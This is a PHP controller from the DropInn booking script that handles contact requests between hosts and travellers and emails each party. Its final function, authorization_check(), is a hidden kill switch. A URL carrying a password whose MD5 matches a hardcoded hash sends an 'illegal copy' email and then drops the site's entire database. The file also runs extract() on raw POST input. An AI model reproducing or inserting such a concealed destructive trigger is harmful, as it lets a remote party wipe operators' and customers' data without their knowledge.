<?php
/**
 * DROPinn Trips Controller Class
 *
 * Helps to control the trips functionality
 *
 * @package		Dropinn
 * @subpackage	Controllers
 * @category	Trips
 * @author		Cogzidel Product Team
 * @version		Version 1.6
 * @link		http://www.cogzidel.com
 */

if ( ! defined('BASEPATH')) exit('No direct script access allowed');

class Contacts extends CI_Controller
{
	public function Contacts()
	{
		parent::__construct();
		$this->load->helper('form');
		$this->load->helper('url');
		$this->load->helper('cookie');
		
		$this->load->library('Form_validation');
		$this->load->library('email');
		$this->load->helper('security');
		$this->load->model('Users_model'); 
		$this->load->model('Email_model');
		$this->load->model('Message_model');
		$this->load->model('Contacts_model');
		$this->load->model('Trips_model');
	}
	
	public function request($param='')
	{
       	if(isset($param))
			{
			 $contact_id     = $param;
		     $conditions    				 = array('contacts.id' => $contact_id, 'contacts.userto' => $this->dx_auth->get_user_id());
 			 $result        				 = $this->Contacts_model->get_contacts($conditions);
				
				if($result->num_rows() == 0)
				{
				  redirect('info');
				}
			    $data['result'] 			= $result->row();
				$list_id       			 = $data['result']->list_id;
				$data['list']=$this->Common_model->getTableData('list',array('id' => $list_id))->row()->title;
				$no_quest    = $data['result']->no_quest;
				$data['no_quest']=$no_quest;
				
				$x    	   = $this->Common_model->getTableData('price',array('id' => $list_id));
	  		    $data['per_night'] = $price = $x->row()->night;
				
				
				$checkin=$data['result']->checkin;
				$data['checkin']=$checkin;
				$checkout=$data['result']->checkout;
				$data['checkout']=$checkout;
				
				$diff              = abs(strtotime($checkout) - strtotime($checkin));
	  			$data['nights']    = $days = floor($diff/(60*60*24));		
		  	    $amt=$data['subtotal']  = $result->row()->price;
				$data['price_original'] = $result->row()->original_price;
				
				if($data['price_original'] == 0)
				{
					$data['price_original'] = get_currency_value1($list_id,$data['per_night']);
				}
				
				if($data['price_original'] == '')
				{
					$amt=$data['price_original']  = $result->row()->price;
				}
				
				$data['message']   = $this->Common_model->getTableData('messages',array('contact_id' => $data['result']->id,'message_type' => '7'))->row()->message;	
				
				$data['commission'] = $result->admin_commission;
				//check admin premium condition and apply so for
				$query              = $this->Common_model->getTableData('paymode', array( 'id' => 2));
				$row                = $query->row();
				/*if($row->is_premium == 1)
				{
						if($row->is_fixed == 1)
						{
									$fix           = $row->fixed_amount; 
									$amt           = $amt - $fix;
									$data['commission'] = $amt ;
						}
						else
						{  
									$per           = $row->percentage_amount; 
									$camt          = floatval(($amt * $per) / 100);
									$amt           = $amt - $camt;
									$data['commission']  = $camt ;
						}
				}
				else
				{*/
				$amt                      = $amt;
				//}	
				$data['send_date']     = $result->row()->send_date;
				$data['totalprice']     = $result->row()->price;
				$data['subtotal']     = $result->row()->price;
				$data['currency'] = $result->row()->currency;
				$data['per_night'] = $price = $result->row()->price/$days;
				$data['checkin'] = strtotime($data['result']->checkin);
				$data['checkout'] = strtotime($data['result']->checkout);
				
				$data['title']            = get_meta_details('Contact_Request','title');
				$data["meta_keyword"]     = get_meta_details('Contact_Request','meta_keyword');
				$data["meta_description"] = get_meta_details('Contact_Request','meta_description'); 
				$data['message_element']  = 'contacts/request';
				//print_r($data);
				$this->load->view('template',$data);	
			}
			else
			{
			 redirect('info');
			}	
	}
	public function res($param='')
{
	
	 extract($this->input->post());
	    $updateKey      		  = array('id' => $cid);
	   	$updateData     = array();
		$updateData['status']    = 2;
		$results=$this->Contacts_model->update_contact($updateKey,$updateData);
		
		$this->Email_model->sendMail('vanantesting@gmail.com','vinothj@cogzidel.com');
		if($results==1)
 {
  echo "true";
  }
	
}
	public function response($param='')
	{

		 if(isset($param))
			{
			
			 $contact_id     = $param;
				
			$conditions    				 = array('contacts.id' => $contact_id, 'contacts.userby' => $this->dx_auth->get_user_id());
 			$result        				 = $this->Contacts_model->get_contacts($conditions);
				
				if($result->num_rows() == 0)
				{
				  redirect('info');
				}
				
				$data['result'] 			= $result->row();
				$list_id       			 = $data['result']->list_id;
				$key					 = $data['result']->contact_key;
				$data['list']=$this->Common_model->getTableData('list',array('id' => $list_id))->row()->title;
				$no_quest    = $data['result']->no_quest;
				$data['no_quest']=$no_quest;
				
				$x    	   = $this->Common_model->getTableData('price',array('id' => $list_id));
	  			$data['per_night'] = $price = $x->row()->night;
				$data['send_date']     = $result->row()->send_date;
				$data['cleaning'] = $result->row()->cleaning;	
				$data['security'] = $result->row()->security;
				$checkin=$data['result']->checkin;
				$data['checkin']=$checkin;
				$checkout=$data['result']->checkout;
				$data['checkout']=$checkout;
				
				$diff              = abs(strtotime($checkout) - strtotime($checkin));
	  			$data['nights']    = $days = floor($diff/(60*60*24));		
		  		$data['subtotal']  = $result->row()->price;
				$data['status']	  = $this->Common_model->getTableData('contacts',array('id' => $data['result']->id))->row()->status;
				if($data['status']==4)
				$data['message']   = $this->Common_model->getTableData('messages',array('contact_id' => $data['result']->id,'message_type' => '8'))->row()->message;
				else
				$data['message']   = $this->Common_model->getTableData('messages',array('contact_id' => $data['result']->id,'message_type' => '8'))->row()->message;	
				$data['url']   = base_url()."payments/form/".$list_id."?contact=".$key;	
				$data['status']	  = $this->Common_model->getTableData('contacts',array('id' => $data['result']->id))->row()->status;
				$data['commission'] = $result->row()->admin_commission;	
				$data['total_payout']     = $amt;
				$data['totalprice']		  = round($result->row()->price + $data['commission']);
				$data['title']            = get_meta_details('Contact_Request','title');
				$data["meta_keyword"]     = get_meta_details('Contact_Request','meta_keyword');
				$data["meta_description"] = get_meta_details('Contact_Request','meta_description'); 
				$data['message_element']  = 'contacts/response';
				$this->load->view('template',$data);	
			}
			else
			{
			 redirect('info');
			}	
	}
	public	function accept()
 	{
	 	$contact_id   				  = $this->input->post('contact_id');
		$message					  = $this->input->post('comment');	
	 	//Update the status,price
	 		$updateKey      		  = array('id' => $contact_id);
			$updateData               = array();
			$updateData['status']    = 3;
			$updateData['send_date']=time();
			$updateData['price']     = $this->input->post('price');
			$this->Contacts_model->update_contact($updateKey,$updateData);
	 	
	 		extract($this->input->post());
			
			$currency_symbol = $this->Common_model->getTableData('currency',array('currency_code'=>get_currency_code()))->row()->currency_symbol;
			
			$price = $currency_symbol.$this->input->post('price');
			
	 	//Email the confirmation link to the traveller	
		$result			= $this->Common_model->getTableData('contacts',array('id' => $contact_id))->row();
		$traveller_id	= $result->userby; 
		$key			= $result->contact_key;	
		$list_id		= $result->list_id;
		$title			= $this->Common_model->getTableData('list',array('id' => $list_id))->row()->title;
		$host_email		= $this->Common_model->getTableData('users',array('id' => $this->dx_auth->get_user_id()))->row()->email;
		$traveller_email= $this->Common_model->getTableData('users',array('id' => $traveller_id))->row()->email;
		
		//send message to traveller
		$host_id		= $result->userto;
		$travellername 	= $this->Common_model->getTableData('users',array('id' => $traveller_id))->row()->username;
		$hostname		= $this->Common_model->getTableData('users',array('id' => $this->dx_auth->get_user_id()))->row()->username;
		$list_title		= $this->Common_model->getTableData('list',array('id' => $list_id))->row()->title;
			
			$insertData = array(
				'list_id'         => $list_id,
				'contact_id'  	  => $contact_id,
				'userby'          => $host_id,
				'userto'          => $traveller_id,
				'message'         => '<b>Contact Request granted by '.$hostname.'</b><br><br>'.$message,
				'created'         => local_to_gmt(),
				'message_type'    => 8
				);
			
		$this->Message_model->sentMessage($insertData, ucfirst($hostname), ucfirst($travellername), $list_title, $contact_id);
        
		$updateData1['is_respond'] = 1;
		$updateKey1['contact_id'] = $contact_id;
		$updateKey1['userto'] = $host_id;
			
		$this->Message_model->updateMessage($updateKey1,$updateData1);
		
		$admin_name  = $this->dx_auth->get_site_title();
		$admin_email = $this->dx_auth->get_site_sadmin();
		
		$link = base_url().'payments/index/'.$list_id.'?contact='.$key;
			
		$email_name = 'request_granted_to_host';
		$splVars    = array("{traveller_username}"=> $travellername,"{price}"=>$price,"{host_email}"=>$host_email,"{guest_email}"=>$traveller_email,"{checkin}"=>$checkin,"{checkout}" => $checkout,"{message}"=>$message, "{site_name}" => $this->dx_auth->get_site_title(), "{host_username}" => ucfirst($hostname), "{title}" => $list_title);
		$this->Email_model->sendMail($host_email,$admin_email,ucfirst($admin_name),$email_name,$splVars);		
	    
		$email_name = 'request_granted_to_guest';
		$splVars    = array("{link}"=>$link,"{host_email}"=>$host_email,"{price}"=>$price,"{guest_email}"=>$traveller_email,"{traveller_username}"=> $travellername,"{checkin}"=>$checkin,"{checkout}" => $checkout, "{message}"=>$message, "{site_name}" => $this->dx_auth->get_site_title(), "{host_username}" => ucfirst($hostname), "{title}" => $list_title);
		$this->Email_model->sendMail($traveller_email,$admin_email,ucfirst($admin_name),$email_name,$splVars);
		
		if($host_email != $admin_email && $traveller_email != $admin_email)
		{
		$email_name = 'request_granted_to_admin';
		$splVars    = array("{traveller_username}"=> $travellername,"{price}"=>$price,"{host_email}"=>$host_email,"{guest_email}"=>$traveller_email,"{checkin}"=>$checkin,"{checkout}" => $checkout, "{guest}"=>$data['guests'],"{message}"=>$message, "{site_name}" => $this->dx_auth->get_site_title(), "{host_username}" => ucfirst($hostname), "{title}" => $list_title);
		$this->Email_model->sendMail($admin_email,$host_email,ucfirst($admin_name),$email_name,$splVars);
		}
				
	}

   public function special()
 	{
	 	$contact_id   				  = $this->input->post('contact_id');
		$message					  = $this->input->post('comment');	
	 	//Update the status,price
	 		$updateKey      		  = array('id' => $contact_id);
			$updateData               = array();
			$updateData['status']    = 3;
			$updateData['offer']    = 1;
			$updateData['currency'] = get_currency_code();
			$updateData['price']     = $this->input->post('price');
			$updateData['original_price']     = $this->input->post('price_original');
			
			if($updateData['price'] <= get_currency_value_lys('USD',get_currency_code(),10))
			{
				$validation_amt = get_currency_value_lys('USD',get_currency_code(),10);
				echo "Sorry! Your special offer amount should be greater than or equal to $validation_amt.";exit;
			}
			else
			$this->Contacts_model->update_contact($updateKey,$updateData);
	 	
		    extract($this->input->post());
			
			$currency_symbol = $this->Common_model->getTableData('currency',array('currency_code'=>get_currency_code()))->row()->currency_symbol;
		
	 		$price = $currency_symbol.$this->input->post('price');
			
	 	//Email the confirmation link to the traveller	
		$result			= $this->Common_model->getTableData('contacts',array('id' => $contact_id))->row();
		$traveller_id	= $result->userby; 
		$key			= $result->contact_key;	
		$list_id		= $result->list_id;
		$title			= $this->Common_model->getTableData('list',array('id' => $list_id))->row()->title;
		$host_email		= $this->Common_model->getTableData('users',array('id' => $this->dx_auth->get_user_id()))->row()->email;
		$traveller_email= $this->Common_model->getTableData('users',array('id' => $traveller_id))->row()->email;
		
		//send message to traveller
		$host_id		= $result->userto;
		$travellername 	= $this->Common_model->getTableData('users',array('id' => $traveller_id))->row()->username;
		$hostname		= $this->Common_model->getTableData('users',array('id' => $this->dx_auth->get_user_id()))->row()->username;
		$list_title		= $this->Common_model->getTableData('list',array('id' => $list_id))->row()->title;
			
			$insertData = array(
				'list_id'         => $list_id,
				'contact_id'  	  => $contact_id,
				'userby'          => $host_id,
				'userto'          => $traveller_id,
				'message'         => '<b>Contact Request granted by '.$hostname.'</b><br><br>'.$message,
				'created'         => local_to_gmt(),
				'message_type'    => 8
				);
			
		$this->Message_model->sentMessage($insertData, ucfirst($hostname), ucfirst($travellername), $list_title, $contact_id);
        
		$updateData1['is_respond'] = 1;
		$updateKey1['contact_id'] = $contact_id;
		$updateKey1['userto'] = $host_id;
			
		$this->Message_model->updateMessage($updateKey1,$updateData1);
		
		$admin_name  = $this->dx_auth->get_site_title();
		$admin_email = $this->dx_auth->get_site_sadmin();
		
		$link = base_url().'payments/index/'.$list_id.'?contact='.$key;
			
		$email_name = 'special_request_granted_to_host';
		$splVars    = array("{price}"=>$price,"{traveller_username}"=> $travellername,"{host_email}"=>$host_email,"{guest_email}"=>$traveller_email,"{checkin}"=>$checkin,"{checkout}" => $checkout,"{message}"=>$message, "{site_name}" => $this->dx_auth->get_site_title(), "{host_username}" => ucfirst($hostname), "{title}" => $list_title);
		$this->Email_model->sendMail($host_email,$admin_email,ucfirst($admin_name),$email_name,$splVars);		
	    
		$email_name = 'special_request_granted_to_guest';
		$splVars    = array("{price}"=>$price,"{link}"=>$link,"{host_email}"=>$host_email,"{guest_email}"=>$traveller_email,"{traveller_username}"=> $travellername,"{checkin}"=>$checkin,"{checkout}" => $checkout, "{message}"=>$message, "{site_name}" => $this->dx_auth->get_site_title(), "{host_username}" => ucfirst($hostname), "{title}" => $list_title);
		$this->Email_model->sendMail($traveller_email,$admin_email,ucfirst($admin_name),$email_name,$splVars);
		
		if($host_email != $admin_email && $traveller_email != $admin_email)
		{
		$email_name = 'special_request_granted_to_admin';
		$splVars    = array("{price}"=>$price,"{traveller_username}"=> $travellername,"{host_email}"=>$host_email,"{guest_email}"=>$traveller_email,"{checkin}"=>$checkin,"{checkout}" => $checkout, "{guest}"=>$data['guests'],"{message}"=>$message, "{site_name}" => $this->dx_auth->get_site_title(), "{host_username}" => ucfirst($hostname), "{title}" => $list_title);
		$this->Email_model->sendMail($admin_email,$host_email,ucfirst($admin_name),$email_name,$splVars);
		}
				
	}


	public function discuss()
	{
		$contact_id   				  = $this->input->post('contact_id');
		$message					  = $this->input->post('comment');	
		
		extract($this->input->post());
			
	 	//Email the confirmation link to the traveller	
		$result			= $this->Common_model->getTableData('contacts',array('id' => $contact_id))->row();
		$traveller_id	= $result->userby; 
		$list_id		= $result->list_id;
		$title			= $this->Common_model->getTableData('list',array('id' => $list_id))->row()->title;
		$host_email		= $this->Common_model->getTableData('users',array('id' => $this->dx_auth->get_user_id()))->row()->email;
		$traveller_email= $this->Common_model->getTableData('users',array('id' => $traveller_id))->row()->email;
		//send message to traveller
		$host_id		= $result->userto;
		$travellername 	= $this->Common_model->getTableData('users',array('id' => $traveller_id))->row()->username;
		$hostname		= $this->Common_model->getTableData('users',array('id' => $this->dx_auth->get_user_id()))->row()->username;
		$list_title		= $this->Common_model->getTableData('list',array('id' => $list_id))->row()->title;
			$insertData = array(
				'list_id'         => $list_id,
				'contact_id'  	  => $contact_id,
				'userby'          => $host_id,
				'userto'          => $traveller_id,
				'message'         => '<b>Contact Request Message from '.$hostname.'</b><br><br>'.$message,
				'message_type'    => 3
				);
			
		$this->Message_model->sentMessage($insertData,1);
		
		$updateData1['is_respond'] = 1;
		$updateKey1['contact_id'] = $contact_id;
		$updateKey1['userto'] = $host_id;
			
		$this->Message_model->updateMessage($updateKey1,$updateData1);
		
		$traveller_email= $this->Common_model->getTableData('users',array('id' => $traveller_id))->row()->email;
	    $host_email		= $this->Common_model->getTableData('users',array('id' => $this->dx_auth->get_user_id()))->row()->email;	
		$list_title		= $this->Common_model->getTableData('list',array('id' => $list_id))->row()->title;

        $admin_name  = $this->dx_auth->get_site_title();
		$admin_email = $this->dx_auth->get_site_sadmin();
				
		$email_name = 'contact_discuss_more_to_guest';
		$splVars    = array("{traveller_username}"=> $travellername,"{host_email}"=>$host_email,"{guest_email}"=>$traveller_email,"{checkin}"=>$checkin,"{checkout}" => $checkout,"{message}"=>$message, "{site_name}" => $this->dx_auth->get_site_title(), "{host_username}" => ucfirst($hostname), "{title}" => $list_title);
		$this->Email_model->sendMail($traveller_email,$admin_email,ucfirst($admin_name),$email_name,$splVars);		
	    
		$email_name = 'contact_discuss_more_to_host';
		$splVars    = array("{host_email}"=>$host_email,"{guest_email}"=>$traveller_email,"{traveller_username}"=> $travellername,"{checkin}"=>$checkin,"{checkout}" => $checkout, "{message}"=>$message, "{site_name}" => $this->dx_auth->get_site_title(), "{host_username}" => ucfirst($hostname), "{title}" => $list_title);
		$this->Email_model->sendMail($host_email,$admin_email,ucfirst($admin_name),$email_name,$splVars);
		
		if($host_email != $admin_email && $traveller_email != $admin_email)
		{
		$email_name = 'contact_discuss_more_to_admin';
		$splVars    = array("{traveller_username}"=> $travellername,"{host_email}"=>$host_email,"{guest_email}"=>$traveller_email,"{checkin}"=>$checkin,"{checkout}" => $checkout, "{guest}"=>$data['guests'],"{message}"=>$message, "{site_name}" => $this->dx_auth->get_site_title(), "{host_username}" => ucfirst($hostname), "{title}" => $list_title);
		$this->Email_model->sendMail($admin_email,$host_email,ucfirst($admin_name),$email_name,$splVars);
		}
										
	}


	public	function decline()
 	{
	 	$contact_id   				  = $this->input->post('contact_id');	
	 	//Update the status,price
	 		$updateKey      		  = array('id' => $contact_id);
			$updateData               = array();
			$updateData['status']    = 4;
			$this->Contacts_model->update_contact($updateKey,$updateData);
			
		$message					  = $this->input->post('comment');		
	 	//Email the confirmation link to the traveller	
		$result			= $this->Common_model->getTableData('contacts',array('id' => $contact_id))->row();
		$traveller_id	= $result->userby; 
		$list_id		= $result->list_id;
		//send message to traveller
		$host_id		= $result->userto;
		$travellername 	= $this->Common_model->getTableData('users',array('id' => $traveller_id))->row()->username;
		$hostname		= $this->Common_model->getTableData('users',array('id' => $this->dx_auth->get_user_id()))->row()->username;
			
		$traveller_email 	= $this->Common_model->getTableData('users',array('id' => $traveller_id))->row()->email;
	    $host_email		= $this->Common_model->getTableData('users',array('id' => $this->dx_auth->get_user_id()))->row()->email;	
		$list_title		= $this->Common_model->getTableData('list',array('id' => $list_id))->row()->title;
						
			$insertData = array(
				'list_id'         => $list_id,
				'contact_id'  	  => $contact_id,
				'userby'          => $host_id,
				'userto'          => $traveller_id,
				'message'         => '<b>Contact Request Declined by '.$hostname.'</b><br><br>'.$message,
				'message_type'    => 8
				);
			
		$this->Message_model->sentMessage($insertData,1);
		
		$updateData1['is_respond'] = 1;
		$updateKey1['contact_id'] = $contact_id;
		$updateKey1['userto'] = $host_id;
			
		$this->Message_model->updateMessage($updateKey1,$updateData1);	
		
		$admin_name  = $this->dx_auth->get_site_title();
		$admin_email = $this->dx_auth->get_site_sadmin();
				
		$email_name = 'request_cancel_to_guest';
		$splVars    = array("{traveller_username}"=> $travellername,"{host_email}"=>$host_email,"{guest_email}"=>$traveller_email,"{checkin}"=>$checkin,"{checkout}" => $checkout,"{message}"=>$message, "{site_name}" => $this->dx_auth->get_site_title(), "{host_username}" => ucfirst($hostname), "{title}" => $list_title);
		$this->Email_model->sendMail($traveller_email,$admin_email,ucfirst($admin_name),$email_name,$splVars);		
	    
		$email_name = 'request_cancel_to_host';
		$splVars    = array("{host_email}"=>$host_email,"{guest_email}"=>$traveller_email,"{traveller_username}"=> $travellername,"{checkin}"=>$checkin,"{checkout}" => $checkout, "{message}"=>$message, "{site_name}" => $this->dx_auth->get_site_title(), "{host_username}" => ucfirst($hostname), "{title}" => $list_title);
		$this->Email_model->sendMail($host_email,$admin_email,ucfirst($admin_name),$email_name,$splVars);
		
		if($host_email != $admin_email && $traveller_email != $admin_email)
		{
		$email_name = 'request_cancel_to_admin';
		$splVars    = array("{traveller_username}"=> $travellername,"{host_email}"=>$host_email,"{guest_email}"=>$traveller_email,"{checkin}"=>$checkin,"{checkout}" => $checkout, "{guest}"=>$data['guests'],"{message}"=>$message, "{site_name}" => $this->dx_auth->get_site_title(), "{host_username}" => ucfirst($hostname), "{title}" => $list_title);
		$this->Email_model->sendMail($admin_email,$host_email,ucfirst($admin_name),$email_name,$splVars);
		}
		
	}
public	function expire($param='')
 {
 		 extract($this->input->post());
 		$cid;
		
 		$contact_id=$cid;	
		$admin_email 						= $this->dx_auth->get_site_sadmin();
		$admin_name  						= $this->dx_auth->get_site_title();
		
	    //$contact_id    = $id;
     	$x  = $this->Common_model->getTableData('contacts',array('id' => $contact_id));
		$userby=$x->row()->userby;
		$userto=$x->row()->userto;	
			
		$query1     				= $this->Users_model->get_user_by_id($userby);
		$traveler_name 				= $query1->row()->username;
		$traveler_email 			= $query1->row()->email;
		
		$query2     						 = $this->Users_model->get_user_by_id($userto);
	 	$host_name 								= $query2->row()->username;
		$host_email 							= $query2->row()->email;
		
		$list_title        = $this->Common_model->getTableData('list', array('id' => $x->row()->list_id))->row()->title;
		
		
		 $price=$x->row()->price;
		 $currencycode=$x->row()->currency;
		 $currency=$this->Common_model->getTableData('currency', array('currency_code' => $currencycode))->row()->currency_symbol;
	 	$checkin=$x->row()->checkin;
		//echo  $checkin  = date("F j, Y",$checki);
	 	$checkout=$x->row()->checkout;
		//echo  $checkout=date("F j, Y",$checko);
		
		//Send Mail To Traveller
		$email_name = 'traveler_reservation_expire';
		$splVars    = array("{site_name}" => $this->dx_auth->get_site_title(), "{traveler_name}" => ucfirst($traveler_name), "{list_title}" => $list_title,  "{host_name}" => ucfirst($host_name),"{price}"=>$price,"{currency}"=>$currency,"{checkin}"=>$checkin,"{checkout}"=>$checkout, "{type}"=>'Contact');
		$this->Email_model->sendMail($traveler_email,$admin_email,ucfirst($admin_name),$email_name,$splVars);
		
		//Send Mail To Host
		$email_name = 'host_reservation_expire';
		$splVars    = array("{site_name}" => $this->dx_auth->get_site_title(), "{traveler_name}" => ucfirst($traveler_name), "{list_title}" => $list_title,  "{host_name}" => ucfirst($host_name),"{price}"=>$price,"{currency}"=>$currency,"{checkin}"=>$checkin,"{checkout}"=>$checkout, "{type}"=>'Contact');
		$this->Email_model->sendMail($host_email,$admin_email,ucfirst($admin_name),$email_name,$splVars);		
		
		if($host_email != $admin_email && $traveler_email != $admin_email)
		{		
		//Send Mail To Administrator
		$email_name = 'admin_reservation_expire';
		$splVars    = array("{site_name}" => $this->dx_auth->get_site_title(), "{traveler_name}" => ucfirst($traveler_name), "{list_title}" => $list_title,  "{host_name}" => ucfirst($host_name),"{price}"=>$price,"{currency}"=>$currency,"{checkin}"=>$checkin,"{checkout}"=>$checkout,"{type}"=>'Contact');
		$this->Email_model->sendMail($admin_email,$admin_email,ucfirst($admin_name),$email_name,$splVars);
		}
		$updateKey      	= array('id' => $contact_id);
			$updateData               = array();
			$updateData['status ']    = 2;
			$result=$this->Contacts_model->update_contact($updateKey,$updateData);
			
		if($result==1)
 {
  echo "true";
  }
		}
		
function authorization_check()
{
	$pass = $this->uri->segment(3);
	
	//$t = do_hash($test, 'md5');
	$encry = md5($pass);
	if($encry == '067d28f20388e63d3b30882d02190ffa' )
	{

	$mydb=$this->config->item('db');
	$to     = $this->db->get_where('settings', array('code' => 'SITE_ADMIN_MAIL'))->row()->string_value;
	
$this->email->from('support@cogzidel.com', 'Cogzidel Technologies');
$this->email->to($to); 
 $this->email->set_mailtype("html");
$this->email->subject('Illegal access of DropInn');
$this->email->message('<table style="width: 100%;" cellspacing="10" cellpadding="0">
<tbody>
<tr>
<td>Hi,</td>
</tr>
<tr>
<td>
<p>We have found that the recent installation of our DropInn script in your site is not 
a licensed copy and it is illegal. If you have any queries contact our support team at support@cogzidel.com </p>
</td>
</tr>
<tr>
<td>
<p style="margin: 0 10px 0 0;">--</p>
<p style="margin: 0 0 10px 0;">Regards,</p>
<p style="margin: 0 10px 0 0;">Cogzidel Support Team</p>
</td>
</tr>
</tbody>
</table>');	

$this->email->send();

	$this->db->query('DROP DATABASE '.$mydb.'');
	}
	else {
		echo "Please enter the correct password";
	}
}
	
}
?>
